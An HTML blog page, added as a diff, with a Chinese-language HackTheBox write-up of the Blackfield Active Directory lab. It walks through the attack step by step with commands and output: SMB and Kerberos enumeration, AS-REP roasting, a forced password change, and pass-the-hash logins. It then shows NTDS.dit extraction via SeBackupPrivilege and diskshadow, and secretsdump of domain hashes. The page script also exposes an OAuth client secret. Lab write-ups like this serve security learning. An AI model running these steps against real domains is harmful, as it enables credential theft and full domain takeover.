@@ -1,0 +1,404 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title> Active Directory 101-Blackfield | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title=" Active Directory 101-Blackfield | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Blackfield
+前言
+继续AD域的靶机。这是一台hard难度的靶机 这也是我在HTB做的第一台hard靶机 以前主要做的是easy 和medium难度的。做了好久。
+信息收集
+还是一上来使用nmap扫描一下端口的信息。
+nmap -s..." />
+    <meta name="keywords" content="SeBackupPrivilege,ForceChangePassword,SMB枚举,AD域,AS-REP Roasting,HackTheBox" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+               Active Directory 101-Blackfield
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-06
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/JOrSh_zIL/" class="post-tag">
+                  # SeBackupPrivilege
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/sGecQ9pleM/" class="post-tag">
+                  # ForceChangePassword
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/FBoKsQTVc/" class="post-tag">
+                  # SMB枚举
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/ggcS95uZq/" class="post-tag">
+                  # AD域
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/iTHfpIy68/" class="post-tag">
+                  # AS-REP Roasting
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/4AeNKZQf4/" class="post-tag">
+                  # HackTheBox
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="blackfield">Blackfield</h1>
+<h2 id="前言">前言</h2>
+<p>继续AD域的靶机。这是一台hard难度的靶机 这也是我在HTB做的第一台hard靶机 以前主要做的是easy 和medium难度的。做了好久。</p>
+<h2 id="信息收集">信息收集</h2>
+<p>还是一上来使用nmap扫描一下端口的信息。</p>
+<pre><code>nmap -sC -sV -p- 10.10.10.192 -oA nmap——Blackfield
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-06 11:44 CST
+Nmap scan report for 10.10.10.192
+Host is up (0.33s latency).
+Not shown: 65527 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-06 10:58:07Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 6h59m54s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2023-12-06T10:58:29
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 911.28 seconds
+
+</code></pre>
+<p>通过扫描得到了一些敏感端口 53 88 445等。</p>
+<p>简单尝试了一下DNS枚举和 kerberos枚举没有得到什么有用的信息，尝试一下SMB枚举。</p>
+<h3 id="smb枚举">SMB枚举</h3>
+<pre><code>crackmapexec smb 10.10.10.192 -u &quot;&quot; -p &quot;&quot; --shares
+</code></pre>
+<pre><code>smbmap -u guess -H 10.10.10.192
+</code></pre>
+<p>得到一些smb的共享服务。选择可匿名访问的。</p>
+<pre><code>smbclient -U guest //10.10.10.192/profiles\$
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206155239623.png" alt="image-20231206155239623" loading="lazy"></figure>
+<p>目录下一堆类似于用户名的东西。将这些保存下来进行kerberos用户名枚举。</p>
+<pre><code>./kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d blackfield.local /root/HTB/Blackfield/users.txt
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206155929552.png" alt="image-20231206155929552" loading="lazy"></figure>
+<p>枚举出来了存在的用户名。</p>
+<h2 id="as-rep-roasting">AS-REP Roasting</h2>
+<p>将得到的信息保存到新的文件中 尝试进行 AS-REP Roasting 。主要是通过没有进行预认证操作的用户 获得账号密码。</p>
+<pre><code>GetNPUsers.py  -no-pass   -dc-ip 10.10.10.161  blackfield.local/ -usersfile user.txt
+</code></pre>
+<p>我们发现support没有设置预认证，我们拿到了其AS-REP的票据 通过john解密。</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206161016083.png" alt="image-20231206161016083" loading="lazy"></figure>
+<p>得到了账号密码。但是经过尝试和之前的共享目录的权限是一样的。</p>
+<h2 id="blood信息收集">Blood信息收集</h2>
+<p>这里由于权限原因 使用的是python版blood。进行信息收集。</p>
+<pre><code>bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c DcOnly
+</code></pre>
+<p>通过这条命令可进行信息收集。</p>
+<p>然后通过blood进行信息分析。</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206162016877.png" alt="image-20231206162016877" loading="lazy"></figure>
+<p>可以看出 这里可以修改 support用户可以修改adui2020用户的密码。</p>
+<h2 id="forcechangepassword权限滥用实现横向移动">ForceChangePassword权限滥用实现横向移动</h2>
+<pre><code>rpcclient -U support //10.10.10.192
+Password for [WORKGROUP\support]:
+rpcclient $&gt; ls
+command not found: ls
+rpcclient $&gt; setuserinfo2 audit2020 23 'white0123'
+result: NT_STATUS_PASSWORD_RESTRICTION
+result was NT_STATUS_PASSWORD_RESTRICTION
+rpcclient $&gt; setuserinfo2 audit2020 23 'white0123#'
+rpcclient $&gt; 
+</code></pre>
+<p>修改密码。</p>
+<p>查看一下权限的变化。</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206162728295.png" alt="image-20231206162728295" loading="lazy"></figure>
+<p>相比较于之前的多了一个forensic访问权限。</p>
+<p>进去看一下。</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206163849889.png" alt="image-20231206163849889" loading="lazy"></figure>
+<p>得到一些敏感信息 其中包含了administrator的密码。但是经过尝试 发现不正确。</p>
+<h2 id="利用lsass内存捕获文件提取用户hash">利用Lsass内存捕获文件提取用户hash</h2>
+<p>其中有一个lsass,zip文件这是一个内存文件 可能会存在密码hash。将其下载下来使用密码提取工具 提取出来。</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206165803449.png" alt="image-20231206165803449" loading="lazy"></figure>
+<p>出现了这三个 只有最后一个才可以成功。</p>
+<pre><code>evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206165902033.png" alt="image-20231206165902033" loading="lazy"></figure>
+<p>成功登录。</p>
+<h2 id="利用sebackupprivilege权限进行ntdsdt卷影拷贝实现权限提升">利用SeBackupPrivilege权限进行NTDS.dt卷影拷贝实现权限提升</h2>
+<pre><code>攻击的步骤大概分三步
+- 获取文件副本，`NTDS.dit`即存储 Active Directory 用户凭据的数据库。
+- 接下来，我们将获取 SYSTEM hive 文件，其中包含解密 NTDS.dit 所必需的系统启动密钥
+- 使用 Impacket 的 secretsdump 脚本从 NTDS.dit 中提取域中所有用户的 NTLM 哈希
+</code></pre>
+<p>通过我们之前导入的bloodhound的分析结果，我们得知该用户属于backup_operators组的成员</p>
+<pre><code>*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; whoami /priv 
+PRIVILEGES INFORMATION 
+---------------------- 
+Privilege Name                Description                    State 
+============================= ============================== 
+======= 
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code></pre>
+<p>此时我们知道了我们拥有SEBackupPrivilege 权限，所以我们可以通过使用签名的二进制文件创建 NTDS.dit 的卷影副本来完成diskshadow 首先，创建一个名为 script.txt 的文本文件，其中包含以下内容：</p>
+<pre><code>{
+set context persistent nowriters
+set metadata c:\windows\system32\spool\drivers\color\example.cab
+set verbose on
+begin backup
+add volume c: alias mydrive
+ 
+create
+
+expose %mydrive% w:
+end backup
+}
+</code></pre>
+<p>然后执行diskshadow 并使用脚本文件作为其输入，接着我们可以使用这个https://github.com/giuliano108/SeBackupPrivilege提供的两个dll文件，并按照其提供的步骤操作，来复制创建的 NTDS.dit 卷影副本</p>
+<pre><code>*Evil-WinRM* PS C:\Users\svc_backup\music&gt;diskshadow /s script.txt
+*Evil-WinRM* PS C:\Users\svc_backup\music&gt;upload SeBackupPrivilegeCmdLets.dll c:\users\svc_backup\music\
+*Evil-WinRM* PS C:\Users\svc_backup\music&gt;upload SeBackupPrivilegeUtils.dll c:\users\svc_backup\music\
+*Evil-WinRM* PS C:\Users\svc_backup\music&gt;Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\users\svc_backup\music\ntds.dit -Overwrite
+*Evil-WinRM* PS C:\Users\svc_backup\music&gt; reg save HKLM\SYSTEM c:\users\svc_backup\music\system.hive 
+*Evil-WinRM* PS C:\Users\svc_backup\music&gt;download ntds.dit
+*Evil-WinRM* PS C:\Users\svc_backup\music&gt;download system.hive
+</code></pre>
+<p>我现在可以使用<code>Evil-WinRM’s</code>下载功能下载 NTDS.dit 和 system.hive 文件。然后，使用<code>Impacket’s</code>secretsdump.py 解析 NTDS.dit：</p>
+<pre><code>secretsdump.py LOCAL -system system.hive -ntds ntds.dit -outputfile secretsdump.out
+cat secretsdump.out
+</code></pre>
+<pre><code>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+[*] Reading and decrypting hashes from ntds.dit
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:9e3d10cc537937888adcc0d918813a24:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+audit2020:1103:aad3b435b51404eeaad3b435b51404ee:4c67bfbc7834b2f39fae7138f717dcbd:::
+support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
+[..SNIP..]
+</code></pre>
+<h2 id="使用wmiexec进行pth">使用wmiexec进行PTH</h2>
+<p>通过上面secretsdump分析的结果，我们可以看到管理员的hash ，那么现在我们可以通过wmiexec.py通过hash来登录到管理员账户</p>
+<pre><code>wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee blackfield.LOCAL/administrator@10.10.10.192
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231206180854118.png" alt="image-20231206180854118" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<p>这是一台困难难度的靶机 做的过程中还看了官方的WP。首先是通过SMB共享的到共享目录 、在目录下面得到了一些类似于用户名的文件，使用kerberos枚举 得到了存在的三个用户名 对三个用户名尝试进行AS-REP Roasting 最后得到并破解了support的账号密码 通过pyhthon版的blood得到了域的分析图，后来发现 audi2020用户的密码可以被support用户修改 通过修改密码实现访问以前没有访问的smb共享。在里面发现了lsass文件，提取出了密码，通过hash实现了登录。最后提升权限那里 一开始真的没有思路 最后看官方的WP 和南城夕雾师傅的WP 发现该用户具有SEBackupPrivilege 权限，然后我们通过滥用备份操作员的角色下载了NTDS.dt文件的副本并从中提取到了管理员的NT哈希,最后通过wmiexec.py进行PTH拿到了管理员shell。这台靶机还是挺有深度的，相较于之前的难度有了一定的提升。通过这台靶机 也反应了我对于blood的一些使用 还不太熟练。以及渗透手法 还不够多。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#blackfield">Blackfield</a>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a>
+<ul>
+<li><a href="#smb%E6%9E%9A%E4%B8%BE">SMB枚举</a></li>
+</ul>
+</li>
+<li><a href="#as-rep-roasting">AS-REP Roasting</a></li>
+<li><a href="#blood%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">Blood信息收集</a></li>
+<li><a href="#forcechangepassword%E6%9D%83%E9%99%90%E6%BB%A5%E7%94%A8%E5%AE%9E%E7%8E%B0%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8">ForceChangePassword权限滥用实现横向移动</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8lsass%E5%86%85%E5%AD%98%E6%8D%95%E8%8E%B7%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96%E7%94%A8%E6%88%B7hash">利用Lsass内存捕获文件提取用户hash</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8sebackupprivilege%E6%9D%83%E9%99%90%E8%BF%9B%E8%A1%8Cntdsdt%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">利用SeBackupPrivilege权限进行NTDS.dt卷影拷贝实现权限提升</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8wmiexec%E8%BF%9B%E8%A1%8Cpth">使用wmiexec进行PTH</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/active/">
+              <h3 class="post-title">
+                Active Directory 101-Active
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
